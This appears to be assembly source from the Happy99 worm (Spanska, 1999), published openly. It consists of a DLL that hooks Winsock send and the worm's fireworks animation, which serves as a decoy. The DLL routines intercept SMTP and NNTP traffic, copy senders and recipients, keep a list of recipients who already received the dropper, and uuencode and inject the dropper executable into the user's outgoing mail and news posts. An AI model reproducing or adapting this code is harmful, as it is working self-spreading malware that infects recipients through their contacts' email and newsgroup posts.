call LocalFree

end_ini_proc:
mov eax, 1
end_ini_proc_with_problem:
ret 12
dllini ENDP

;*******************************************************************************************
;***                                ROUTINE SEND MAIL                                    ***
;*******************************************************************************************

PUBLIC mail
mail proc

;----localise les données de la commande send

call recuperer_offset_et_taille_envoi		;nique ebx, ecx, retourne ebx, ecx

;----- voir si ce qui est envoyé est une commande au serveur ou le corps d'un message

cmp ecx, 100
ja c_pas_une_commande_au_serveur

;==================== analyser la commande au serveur ==============================

;----- c'est une commande au serveur: récupérer des infos

mov eax, [ebx]
and eax, 0DFDFDFDFh
cmp eax, "LIAM"
jne c_pas_from
mov eax, [ebx+4]
and eax, 0DFDFDFFFh
cmp eax, "ORF "
jne c_pas_from
mov ax, word ptr [ebx+8]
and ax, 0FFDFh
cmp ax, ":M"
jne c_pas_from

;---- si c'est la commande "from", on récupère l'envoyeur et sa taille

mov esi, ebx
;mov edi, offset smtp_sender
	mov edi, offset_mem_buffer2_sender
mov smtp_sender_size, ecx
rep movsb

jmp fin_routine_mail_sans_dechargement

;----analyse les données de la commande send

c_pas_from:
mov eax, [ebx]
and eax, 0DFDFDFDFh
cmp eax, "TPCR"
jne c_pas_to
mov eax, [ebx+4]
and eax, 0FFDFDFFFh
cmp eax, ":OT "
jne c_pas_to

;---- si c'est la commande "to", on stocke ce rcpt

call stocke_le_rcpt

;---- on vérifie que ce destinataire n'a pas déjà recu le dropper

mov smtp_recipient_size, ecx
call verifie_destinataire		;nique eax, retour eax=-1 si faut pas envoyer, 0 sinon
cmp eax, 0
je fin_routine_mail_sans_dechargement

;----- deja recu: on annule tout

mov faut_pas_envoyer_mail, -1
jmp fin_routine_mail_sans_dechargement_mais_vidage_des_rcpt

;----- fin d'analyse des commandes

c_pas_to:
jmp fin_routine_mail_sans_dechargement

;================= ce n'est pas une commande, mais un gros send ==========================

c_pas_une_commande_au_serveur:

;------ récupérer les headers

call recupere_headers				;nique eax, retour eax=-1 si couille, 0 si OK
cmp eax, 0
jne fin_routine_mail_sans_dechargement

;------ verifier s'il y a des rcpt

mov esi, offset_mem_buffer2_recipient
lodsw
cmp ax, 00
je fin_routine_mail_sans_dechargement

;------ verifier s'il faut envoyer

cmp faut_pas_envoyer_mail, 0
jne oh_puis_merde

;======================= tout est OK, on envoit le matériel ================================

call recuperer_socket_et_original_send		;nique ebx, eax, renvoie en mémoire

;-------- 1/ envoyer les headers du message 

mov eax, size_headers
mov ebx, offset_mem_buffer2_headers			;HEADER
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call uucode_et_envoie

;-------- 2/ envoyer le point final

mov eax, size_point
mov ebx, offset point					;"."
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

;-------- 3/ envoyer la commande "reset"

mov eax, size_smtp_rset
mov ebx, offset smtp_rset				;RSET
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

;-------- 4/ envoyer from

mov eax, smtp_sender_size
mov ebx, offset_mem_buffer2_sender			;MAIL FROM:
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

;-------- 5/ envoyer autant de rcpt qu'il faut

mov esi, offset_mem_buffer2_recipient
mov edx, offset_mem_buffer2_sender			;limite haute
sub edx, 50

cherche_rcpt:
xor ecx, ecx
mov ebp, esi

cherche_fin_rcpt:
lodsb
inc ecx
cmp esi, edx
ja fin_routine_mail_avec_dechargement
cmp al, 0
je envoyer_data
cmp al, 0Ah
jne cherche_fin_rcpt

mov eax, ecx
mov ebx, ebp						;RCPT
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement
call recoit
cmp eax, " 052"
jne fin_routine_mail_avec_dechargement

jmp cherche_rcpt

;-------- 6/ envoyer data

envoyer_data:
mov eax, size_smtp_data
mov ebx, offset smtp_data			;DATA
call envoie
cmp eax, -1
je fin_routine_mail_avec_dechargement

call recoit
cmp eax, " 453"
jne fin_routine_mail_avec_dechargement

;========================== fin de la routine ==================================

oh_puis_merde:
mov faut_pas_envoyer_mail, 0

fin_routine_mail_sans_dechargement_mais_vidage_des_rcpt:
mov edi, offset_mem_buffer2_recipient		;annuler les rcpt en memoire
xor eax, eax
stosd

fin_routine_mail_sans_dechargement:
mov eax, 1				;retour sans déchargement de ma dll
ret

fin_routine_mail_avec_dechargement:

mov eax, "MMMM"			;retour avec déchargement de ma dll
ret

mail endp

;*******************************************************************************************
;***                                ROUTINE SEND NEWS                                    ***
;*******************************************************************************************

PUBLIC news
news proc

;----analyse les données de la commande send

call recuperer_offset_et_taille_envoi		;nique ebx, ecx, retourne ebx, ecx

;----- voir si ce qui est envoyé est une commande au serveur ou le corps d'un message

cmp ecx, 100
jb fin_routine_news_sans_dechargement

;================== ce n'est pas une commande, mais un gros send ===========================

call recupere_headers			;nique eax, retour eax=-1 si couille, 0 si OK

cmp eax, 0
jne fin_routine_news_sans_dechargement

call recuperer_socket_et_original_send	;nique abx, eax, renvoie en mémoire

;-------- 1/ envoyer les headers du message 

mov eax, size_headers
mov ebx, offset_mem_buffer2_headers			;HEADER
call envoie
cmp eax, -1
je fin_routine_news_avec_dechargement

call uucode_et_envoie

;-------- 2/ envoyer le point final

mov eax, size_point
mov ebx, offset point					;"."
call envoie
cmp eax, -1
je fin_routine_news_avec_dechargement

call recoit
cmp eax, " 042"
jne fin_routine_news_avec_dechargement

;-------- 3/ envoyer la commande "POST"

mov eax, size_nntp_post
mov ebx, offset nntp_post				;POST
call envoie
cmp eax, -1
je fin_routine_news_avec_dechargement

call recoit
cmp eax, " 043"
jne fin_routine_news_avec_dechargement

;========================== fin de la routine ==================================

fin_routine_news_sans_dechargement:
mov eax, 1				;retour sans déchargement de ma dll
ret

fin_routine_news_avec_dechargement:
mov eax, "NNNN"				;retour avec déchargement de ma dll
ret

news endp

;*******************************************************************************************
;***               VERIFIE SI LE DESTINATAIRE A DEJA RECU LE DROPPER                     ***
;*******************************************************************************************

verifie_destinataire:
pushad
mov ebp, ebx

push 100
push offset_mem_buffer2_system_dir
call GetSystemDirectoryA		;généralement C:\WINDOWS\SYSTEM
test eax, eax
jz stop_verifie_destinataire
mov system_dir_size, eax

mov esi, offset liste_name		;concatenate "c:\windows\" and "list.ska"
mov edi, offset_mem_buffer2_system_dir
add edi, system_dir_size
mov ecx, liste_name_size
rep movsb

push 0					;handle of file with attributes to copy (0=Ludwig)
push 80h				;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 4					;how to create (4=OPEN_ALWAYS)
push 0					;address of security descriptor (0=Ludwig)
push 0					;share mode (0=Prevents the file from being shared)
push 0C0000000h				;access (read-write) mode (080000000h=GENERIC_READ)
push offset_mem_buffer2_system_dir	;address of name of the file
call CreateFileA
inc eax
jz stop_verifie_destinataire
dec eax
mov liste_handle, eax

push 5*1024+50
push 40h
call LocalAlloc
test eax, eax
jz close_file
mov offset_mem_buffer, eax

lit_le_fichier:
push 0
push offset liste_size
push (5*1024)
push offset_mem_buffer
push liste_handle
call ReadFile
test eax, eax
jz stop_verifie_destinataire

cmp liste_size, 5*1024		;si le fichier est plus gros que 5 Ko
jb compare_names

push liste_handle
call CloseHandle

push 0
push 80h		;on le remet à zero
push 2			;how to create (2=CREATE_ALWAYS)
push 0
push 0
push 0C0000000h
push offset_mem_buffer2_system_dir
call CreateFileA
inc eax
jz stop_verifie_destinataire
dec eax
mov liste_handle, eax
jmp lit_le_fichier

compare_names:

	mov esi, ebp
add esi, 8
lodsd
mov ebx, eax
lodsd
mov edx, eax

mov esi, offset_mem_buffer		;esi=memoire
mov ecx, esi
add ecx, liste_size			;ecx=limite haute memoire

compare_8_premiers_cara:
lodsd
cmp eax, ebx
je teste_4_8
jmp cherche_0D0A_suivant
teste_4_8:
lodsd
cmp eax, edx
je il_a_deja_recu_le_dropper

sub esi, 4
cherche_0D0A_suivant:
sub esi, 3
cherche_0D0A:
lodsw
cmp esi, ecx
jae pas_dans_la_liste
cmp ax, 0A0Dh
je compare_8_premiers_cara
dec esi
jmp cherche_0D0A

pas_dans_la_liste:

mov edi, esi
	mov esi, ebp
add esi, 8
mov ecx, smtp_recipient_size
sub ecx, 8
push ecx
push edi
rep movsb
mov ax, 0A0Dh
stosw
pop edi
pop ecx

push 0				;addr. of structure needed for overlapped I/O (0 pour normale)
push offset liste_size		;address of nb of bytes written (si jamais tout n'est pas écrit)
push ecx			;number of bytes to write
push edi			;address of data to write to file
push liste_handle		;handle of file to write to
call WriteFile
jmp close_mem_and_file		;test eax inutile

il_a_deja_recu_le_dropper:
push offset_mem_buffer
call LocalFree
push liste_handle
call CloseHandle
popad
mov eax, -1			;retour avec eax=-1 si faut pas envoyer
ret

close_mem_and_file:
push offset_mem_buffer
call LocalFree

close_file:
push liste_handle
call CloseHandle

stop_verifie_destinataire:	;s'il y a le moindre probleme, on envoie quand même
popad
xor eax, eax			;retour avec eax=0 si c OK
ret

;*******************************************************************************************
;***                      RECUPERE LES HEADERS (MAIL OU NEWS)                            ***
;*******************************************************************************************

recupere_headers:
pushad

mov esi, ebx
mov edi, esi
add edi, ecx
mov ecx, edi
add ecx, 100		;?
xor edx, edx

analyse:

mov bx, word ptr [esi]
and bx, 0DFDFh				;fous-moi ce bordel en majuscules
mov ebp, esi

cmp bx, "RF"				;maybe From:
je maybe_find_from
fausse_alerte_a1:
mov esi, ebp
cmp bx, "US"				;maybe Subject:
je maybe_find_subject
fausse_alerte_a2:
mov esi, ebp
cmp bx, "EN"				;maybe Newsgroups:
je maybe_find_newsgroups
fausse_alerte_a3:
mov esi, ebp
cmp bx, "CC"				;maybe CC:
je maybe_find_cc
fausse_alerte_a4:
mov esi, ebp
cmp bx, "CB"				;maybe BCC:
je maybe_find_bcc
fausse_alerte_a5:
mov esi, ebp
cmp bx, 0A0Dh				;maybe end of headers
je maybe_end_headers
fausse_alerte_a6:
mov esi, ebp
inc esi
cmp esi, ecx
jae stop_analyse_headers		;in case of header end or
jmp analyse

maybe_find_from:			;From:
lodsw
lodsd
and eax, 0FFFFDFDFh
cmp eax, " :MO"
jne fausse_alerte_a1
call recupere_un_champ
jmp analyse

maybe_find_subject:			;Subject:
lodsw
lodsd
and eax, 0DFDFDFDFh
cmp eax, "CEJB"
jne fausse_alerte_a2
lodsd
and eax, 0FFFFDFh
cmp eax, 0+" :T"
jne fausse_alerte_a2
call recupere_un_champ
jmp analyse

maybe_find_newsgroups:			;Newsgroups:
lodsw
lodsd
and eax, 0DFDFDFDFh
cmp eax, "RGSW"
jne fausse_alerte_a3
lodsd
and eax, 0DFDFDFDFh
cmp eax, "SPUO"
jne fausse_alerte_a3
lodsw
cmp ax, " :"
jne fausse_alerte_a3
call recupere_un_champ
jmp analyse

maybe_find_cc:				;CC:
lodsw
lodsd
and eax, 0FFFFh
cmp eax, 0+0+" :"
jne fausse_alerte_a4
call recupere_un_champ
jmp analyse

maybe_find_bcc:				;BCC:
lodsw
lodsd
and eax, 0FFFFDFh
cmp eax, 0+" :C"
jne fausse_alerte_a5
call recupere_un_champ
jmp analyse

maybe_end_headers:			;end of headers
lodsd
cmp eax, 0A0D0A0Dh
jne fausse_alerte_a6
push eax

;----rajoute mon petit champ dans le header

mov eax, "pS-X"			;"X-Spanska: Yes" to allow easy filtering :)
stosd
mov eax, "ksna"
stosd
mov eax, "Y :a"
stosd
mov ax, "se"
stosw
add edx, 14

pop eax
stosd
inc edx
inc edx

mov size_headers, edx			;in case of OK
popad
xor eax, eax
ret

stop_analyse_headers:			;in case of error

popad
mov eax, -1
ret

recupere_un_champ:
mov esi, ebp
mov edi, offset_mem_buffer2_headers
add edi, edx
recopie:
lodsb
stosb
inc edx
cmp edx, 2950
ja stop_recupere_un_champ
cmp al, 0Ah
jne recopie
stop_recupere_un_champ:
ret

;*******************************************************************************************
;***                                  ENVOIE                                             ***
;*******************************************************************************************

envoie:
mov ebp, eax

envoie2:
push LARGE 0
push eax
push ebx
push LARGE no_socket
call [original_send]

cmp eax, -1
jne envoi_ok

call WSAGetLastError
cmp eax, 10035
jne stop_envoi
mov eax, ebp
jmp envoie2

stop_envoi:
mov eax, -1
envoi_ok:
ret

;*******************************************************************************************
;***               RECUPERE TAILLE ET CONTENU DE L'ENVOI EN COURS                        ***
;*******************************************************************************************

recuperer_offset_et_taille_envoi:

mov ebx, [esp+32+(5*4)]	;offset du contenu envoyé
mov ecx, [esp+32+(6*4)]	;taille du contenu
ret

;*******************************************************************************************
;***               RECUPERE No SOCKET ET OFFSET DU SEND ORIGINAL                         ***
;*******************************************************************************************

recuperer_socket_et_original_send:

;----- récupérer no de socket

mov ebx, [esp+32+(4*4)]	;no de socket
mov no_socket, ebx

;----- récupérer le saut au send original

pop eax
pop ebx
push ebx
push eax
add ebx, 34+25		;ATTENTION!! dépend du dropper!!!!!!!!!!!!!

mov eax, [ebx]		;recup du saut relatif depuis la fin du patch jusqu'au send original
add ebx, eax
add ebx, 4
mov original_send, ebx
ret

;*******************************************************************************************
;***                         UUCODE ET ENVOIE LE DROPPER                                 ***
;*******************************************************************************************

uucode_et_envoie:

;------- se réserver 20 Ko de mémoire

push 20*1024
push 40h
call LocalAlloc
test eax, eax
jz fin_routine_uucodage
mov offset_mem_buffer, eax

;------- récupérer le path/nom du dropper

push 100
push offset_mem_buffer2_system_dir
call GetSystemDirectoryA		;généralement C:\WINDOWS
test eax, eax
jz fin_routine_uucodage_avec_liberer_memoire
mov system_dir_size, eax

mov esi, offset dropper_name		;concatenate "c:\windows\" and "drop.exe"
mov edi, offset_mem_buffer2_system_dir
add edi, system_dir_size
mov ecx, dropper_name_size
rep movsb

;------- mapper le dropper en mémoire

push 0			;handle of file with attributes to copy (0=Ludwig)
push 80h		;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 3			;how to create (3=OPEN_EXISTING)
push 0			;address of security descriptor (0=Ludwig)
push 0			;share mode (0=Prevents the file from being shared)
push 080000000h		;access (read-write) mode (080000000h=GENERIC_READ)
push offset_mem_buffer2_system_dir	;address of name of the file
call CreateFileA
inc eax
jz fin_routine_uucodage_avec_liberer_memoire
dec eax
mov dropper_handle, eax

push offset sizeofmappedfile	;address of high-order word for file size (si ca dépasse)
push dropper_handle		;handle of file to get size of 
call GetFileSize
inc eax
jz fin_routine_uucodage_avec_fermer_dropper
dec eax
mov sizeofmappedfile, eax

push 0			;name of file-mapping object (0=sans nom)
push 0			;low-order 32 bits of object size  
push 0			;high-order 32 bits of object size  (0=meme taille que le fichier)
push 2			;protection for mapping object (2=PAGE_READONLY)
push 0			;optional security attributes (0=défaut)
push dropper_handle	;handle of file to map
call CreateFileMappingA
test eax, eax
jz fin_routine_uucodage_avec_fermer_dropper
mov filemappinghandle, eax

push 0			;number of bytes to map (0=en entier)
push 0			;low-order 32 bits of file offset
push 0			;high-order 32 bits of file offset (0=meme taille que le fichier?)
push 4			;access mode (4=SECTION_MAP_READ)
push filemappinghandle	;file-mapping object to map into address space  
call MapViewOfFile
test eax, eax
jz fin_routine_uucodageavec_fermer_mapping
mov startoffilemapping, eax

;------ uucoder le dropper depuis son mapping (binaire) jusqu'à la zone mémoire réservée

mov esi, offset debut
mov edi, offset_mem_buffer
mov ecx, size_debut
rep movsb				;transférer "begin xxxx.exe"

xor edx, edx
mov eax, sizeofmappedfile
push eax
mov bx, 45
div bx
xor ecx, ecx
mov cx, ax
mov nb_45, ecx
mov reste_45, dl			;calculer le nombre de lignes

mov esi, startoffilemapping
pop ebp
add ebp, esi
mov edx, nb_45

code_ligne_suivante:
mov al, "M"
stosb
mov ecx, 15

code_trois_octets:
	cmp esi, ebp
	jne tu_peux_la_lire_cette_putain_de_memoire3
	xor al, al
	jmp evite_plantage_because_peut_pas_lire_la_memoire3
tu_peux_la_lire_cette_putain_de_memoire3:
lodsb
evite_plantage_because_peut_pas_lire_la_memoire3:
mov ah, al
shr al, 2
and al, 00111111b
jnz pas_zero1
add al, 40h
pas_zero1:
add al, 20h
stosb

mov al, ah
shl al, 4
and al, 00110000b
mov bh, al
	cmp esi, ebp
	jne tu_peux_la_lire_cette_putain_de_memoire
	xor al, al
	jmp evite_plantage_because_peut_pas_lire_la_memoire
tu_peux_la_lire_cette_putain_de_memoire:
lodsb
evite_plantage_because_peut_pas_lire_la_memoire:
mov ah, al
shr al, 4
and al, 00001111b
or al, bh
and al, 00111111b
jnz pas_zero2
add al, 40h
pas_zero2:
add al, 20h
stosb

mov al, ah
shl al, 2
and al, 11111100b
mov bh, al
	cmp esi, ebp
	jne tu_peux_la_lire_cette_putain_de_memoire2
	xor al, al
	jmp evite_plantage_because_peut_pas_lire_la_memoire2
tu_peux_la_lire_cette_putain_de_memoire2:
lodsb
evite_plantage_because_peut_pas_lire_la_memoire2:
mov ah, al
shr al, 6
and al, 00000011b
or al, bh
and al, 00111111b
jnz pas_zero3
add al, 40h
pas_zero3:
add al, 20h
stosb

mov al, ah
and al, 00111111b
jnz pas_zero4
add al, 40h
pas_zero4:
add al, 20h
stosb

dec ecx
jnz code_trois_octets

mov ax, 0A0Dh
stosw

dec edx
jnz code_ligne_suivante

code_la_derniere_ligne:

mov al, reste_45
cmp al, 0
je fin_uu
add al, 20h
stosb

xor eax, eax
xor edx, edx
xor ecx, ecx
mov al, reste_45
mov bl, 3
div bl

mov cl, al
test ah, ah
jz pas_de_reste
inc cx
pas_de_reste:

mov edx, 1
mov reste_45, 0
jmp code_trois_octets

fin_uu:
mov esi, offset fin
mov ecx, size_fin
rep movsb				;transférer "end"

mov ecx, edi
sub ecx, offset_mem_buffer
mov size_uu_file, ecx			;se souvenir de la taille du fichier uucodé

;-------- envoyer des paquets de 1000 octets 

xor edx, edx
xor ecx, ecx
mov eax, size_uu_file
mov bx, 1000
div bx
mov cx, ax
mov nb_1000, ecx
mov reste_1000, edx

mov esi, offset_mem_buffer
inc nb_1000

envoie_la_sauce:

mov ebp, 1000
cmp nb_1000, 1
jne morceau_entier
mov ebp, reste_1000
morceau_entier:
mov eax, ebp
mov ebx, esi
call envoie

cmp eax, -1
je fin_routine_uucodage_avec_unmap

envoi_ok2:
add esi, ebp
dec nb_1000
jnz envoie_la_sauce

;------- tout fermer: fichiers (dropper, dropper uucodé) et mémoire (mapping*2, buffer)

fin_routine_uucodage_avec_unmap:
push startoffilemapping
call UnmapViewOfFile

fin_routine_uucodageavec_fermer_mapping:
push filemappinghandle
call CloseHandle

fin_routine_uucodage_avec_fermer_dropper:
push dropper_handle
call CloseHandle

fin_routine_uucodage_avec_liberer_memoire:
push offset_mem_buffer
call LocalFree

fin_routine_uucodage:
ret

;*******************************************************************************************
;***                        RECUPERE LES MESSAGES ENTRANTS                               ***
;*******************************************************************************************

recoit:
push LARGE 0
push LARGE 60
push offset_mem_buffer2_rcv
push LARGE no_socket
call recv
cmp eax, -1
je recoit

mov ebx, offset_mem_buffer2_rcv
mov eax, [ebx]
ret

;*******************************************************************************************
;***                          STOCKER RECIPIENT EN MEMOIRE                               ***
;*******************************************************************************************

stocke_le_rcpt:
pushad
mov esi, offset_mem_buffer2_recipient
mov edx, esi
add edx, 2900				;ecx=limite haute memoire

cherche_00_suivant:
lodsb
cmp esi, edx
jae stop_stocke_le_rcpt
cmp al, 0
jne cherche_00_suivant

stocke_a_cet_offset:
dec esi
mov edi, esi
mov esi, ebx
rep movsb
mov eax, 0
stosd

stop_stocke_le_rcpt:
popad
ret

end dll

;--------------------------- (c) Spanska 1999 ---------------------------------
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[Happy99_ska_dll.asm]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[Happy99_fireworks.asm]ÄÄÄ
;Graphic effect of Happy99, by Spanska
;A cute fireworks animation, done using a particle algorithm stolen from 
;a beautiful 256 bytes demo by Picard/Hydrogen
;
;if you want to understand comments, learn french or use Altavista ;)
;at the very end, you can post a message for me in alt.comp.virus

;--------------------------- (c) Spanska 1999 ---------------------------------

.386
.model flat

extrn		GetModuleHandleA	:PROC
extrn		RegisterClassA		:PROC
extrn		CreateWindowExA		:PROC
extrn		ShowWindow		:PROC
extrn		UpdateWindow		:PROC
extrn		PeekMessageA		:PROC
extrn		SetPixelV		:PROC
extrn		TranslateMessage	:PROC
extrn		DispatchMessageA	:PROC
extrn		DefWindowProcA		:PROC
extrn		LocalAlloc		:PROC
extrn		LocalFree		:PROC
extrn		GetDC			:PROC
extrn		ReleaseDC		:PROC
extrn		PostQuitMessage		:PROC
extrn		ExitProcess		:PROC

nombre_explosion_maxi equ 16

.data

wndclass:
        clsStyle          dd 4003h	; class style
        clsLpfnWndProc    dd ?
        clsCbClsExtra     dd 0
        clsCbWndExtra     dd 0
        clsHInstance      dd ?		; instance handle
        clsHIcon          dd 0		; class icon handle
        clsHCursor        dd 0		; class cursor handle
        clsHbrBackground  dd 7		; class background brush
        clsLpszMenuName   dd 0		; menu name
        clsLpszClassName  dd ?		; far ptr to class name

msg:
    msHWND          dd ?
    msMESSAGE       dd ?
    msWPARAM        dd ?
    msLPARAM        dd ?
    msTIME          dd ?
    msPT            dd ?
    protege dd ?
    
nb_explosions	dd 0
compteur 	dd 0
color		dd ?
yy 		dd ?
xx 		dd ?
seed 		dd 0FFAABB11h
theDC		dd ?
writebuffer	dd ?
nom_fenetre 	db "Happy 2000 to 29A readers !!",0
handle		dd ?
handle_wd	dd ?
adresse_retour dd ?

.code

HOST:

;----- se réserver de la mémoire

push (32*257)*nombre_explosion_maxi		;number of bytes to allocate
push LARGE 40h					;allocation attributes (40h=LMEM_ZEROINIT)
call LocalAlloc
mov writebuffer, eax


;----- enregistrer la wndclass

push 0
call GetModuleHandleA
mov handle, eax

mov clsHInstance, eax
mov eax, offset wndproc
mov clsLpfnWndProc, eax
mov clsLpszClassName, offset nom_fenetre

push offset wndclass
call RegisterClassA

;----- creer la fenetre

push 0
push handle
push 0
push 0
push 512			;hauteur
push 256			;largeur
push 100			;y
push 100			;x
push 00080000h+00040000h
push offset nom_fenetre
push offset nom_fenetre
push 0 				;extra style
call CreateWindowExA
mov handle_wd, eax

push 1
push handle_wd
call ShowWindow

push handle_wd
call UpdateWindow

;----- le message loop

msg_loop:
push 1
push 0
push 0
push 0
push offset msg
call PeekMessageA
cmp eax, 0
jnz process_messages

;-------- dessiner tous les points

mov eax, compteur
and eax, nombre_explosion_maxi-1
mov compteur, eax
cmp eax, 0
jz ini_explosion

la_suite:
push handle_wd
call GetDC
mov theDC, eax

mov ecx, 16*256				;16 explosions of 256 pixels each
mov esi, writebuffer

zozo2:

mov eax, dword ptr [esi+8]			;get Y coordinate
mov dword ptr [esi+20], eax			;save it in a unused zone
mov eax, dword ptr [esi+12]			;get X coordinate
mov dword ptr [esi+24], eax			;save it in unused zone

add dword ptr [esi], 001000h			;gravity: add 0.1 pixel to Y speed
lodsd						;load Y speed
add dword ptr [esi+4], eax			;add Y speed to Y coordinate 
lodsd						;load X speed
add dword ptr [esi+4], eax			;add X speed to X coordinate

lodsd						;load Y coordinate
sar eax, 16					;remove decimal part
mov edx, eax					;save in edx
lodsd						;load X coordinate
sar eax, 16					;remove decimal part
mov ebx, eax					;save in ebx

lodsd						;load color
cmp eax, 0					;color=0?
jne point_pas_noir				;no: decrease color intensity
add esi, 8					;yes: go to next pixel
jmp fin_loop

point_pas_noir:
sub byte ptr [esi-4], 1				;decrease Red component of color
jnc R_pas_a_zero				;if positive, go to next component
mov byte ptr [esi-4], 0				;if negative, put 0
R_pas_a_zero:
sub byte ptr [esi-3], 1				;decrease Green component of color
jnc G_pas_a_zero				;if positive, go to next component
mov byte ptr [esi-3], 0				;if negative, put 0
G_pas_a_zero:
sub byte ptr [esi-2], 1				;decrease Blue component of color
jnc B_pas_a_zero				;if positive, go to next component
mov byte ptr [esi-2], 0				;if negative, put 0
B_pas_a_zero:

push esi		;be careful, this API fucks esi, ecx
push ecx

push eax		;colorref
push edx		;y
push ebx		;x
push theDC		;the Device Context
call SetPixelV		;quand la fenetre est repeinte, on met le pixel à sa coordonnée

pop ecx
pop esi

lodsd			;get the precedent Y coord from unused zone where we saved it
sar eax, 16		;remove decimal part
mov edx, eax		;put in edx
lodsd			;get the precedent X coord from unused zone where we saved it
sar eax, 16		;remove decimal part

push esi		;be careful, this API fucks esi, ecx
push ecx

push 0			;black
push edx
push eax
push theDC
call SetPixelV		;remove pixel from precedent position

pop ecx
pop esi

fin_loop:
add esi, 4		;esi points to next pixel structure

dec ecx
jnz zozo2

push theDC
push handle_wd
call ReleaseDC

inc compteur

jmp msg_loop

;----- pour voir si la fenetre est fermée

process_messages:

cmp msMESSAGE, 12h	;WM_QUIT equ 0012h
je end_loop

push offset msg
call TranslateMessage
push offset msg
call DispatchMessageA
jmp msg_loop

end_loop:

push writebuffer
call LocalFree

push    msWPARAM
call    ExitProcess             ;this terminates the program

;----- procédure de fenêtre vide pour accélérer

wndproc:

pop eax
mov adresse_retour, eax
cmp dword ptr [esp+4], 2
jne suite

push 0
call PostQuitMessage
xor eax, eax
jmp suite2

suite:
call DefWindowProcA

suite2:
mov ecx, adresse_retour
push ecx

ret

;----- procédure pour initialiser une explosion

ini_explosion:

mov eax, nb_explosions
and eax, nombre_explosion_maxi-1
mov nb_explosions, eax
shl eax, 13				;chaque explosion se garde un buffer de 8192
mov edi, writebuffer			;(256 pixels, 32 bits par pixel)
add edi, eax
mov ecx, 256				;on va calculer les 256 points

call random
shr eax, 7				;X: 0FFFFFFFFh/128 = 1FFFFFF
mov xx, eax				;virgule fixe: 1FF,FFFF = 512
call random
shr eax, 8				;Y: 0FFFFFFFFh/256 = FFFFFF
mov yy, eax				;virgule fixe: FF,FFFF = 256

call random
shr eax, 8				;COULEUR: codee sur 3 octets
or eax, 0AF0F0Fh			;masque pour augmenter la luminosite
mov color, eax

zozo:
call random
shr eax, 15				;VITESSE: 0FFFFFFFFh/32768 = 1FFFF 
mov [edi], eax				;virgule fixe: 1,FFFF = entre 1 et 2
mov [edi+4], ecx			;ANGLE: en radians, ecx presque random

fild dword ptr [edi+4]			;charge l'angle dans le copro
fsin					;sinus = composante en X
fimul dword ptr [edi]			;multiplie par la vitesse: resultat sur le stack
fild dword ptr [edi+4]			;charge l'angle par dessus
fcos					;cosinus = composante en Y
fimul dword ptr [edi]			;multiplie par la vitesse: resultat sur le stack
fistp dword ptr [edi]			;decharge la composante en Y
fistp dword ptr [edi+4]			;decharge la composante en X

add edi, 8
					;structure d'un pixel:
mov eax, yy				;0  dd composante vitesse en Y 
stosd					;4  dd composante vitesse en X
mov eax, xx				;8  dd coordonnee Y
stosd					;12 dd coordonnee X
					;16 dd couleur
mov eax, color				;20 dd rien, used to save precedent Y coord 
stosd					;24 dd rien, used to save precedent X coord
					;28 dd rien
add edi, 12				
loop zozo

inc nb_explosions
jmp la_suite

;----- random

random: 

mov eax, 214013h
imul seed
sub edx, edx                ; Prevent divide overflow by caller
add eax, 2531011h
mov seed, eax
ret

        end     HOST
        
;--------------------------- (c) Spanska 1999 ---------------------------------
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[Happy99_fireworks.asm]ÄÄÄ
